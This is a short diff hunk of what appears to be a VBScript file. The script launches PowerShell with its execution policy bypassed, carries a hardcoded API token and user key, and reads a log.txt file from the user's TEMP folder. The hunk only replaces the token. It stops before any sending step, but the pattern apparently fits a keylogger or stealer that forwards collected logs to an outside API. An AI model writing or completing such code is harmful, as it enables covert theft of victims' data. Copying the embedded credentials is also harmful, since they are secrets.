@@ -14,7 +14,7 @@ End If
 
 ' Define the PowerShell script for API execution
 psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
-    "$API_TOKEN='a7apgvyetoayv26hfoh15t11axi6mp'; " & _
+    "$API_TOKEN='a7ozraj6ux2t1awjdui1u16fcm9x7r'; " & _
     "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
     "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
     "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
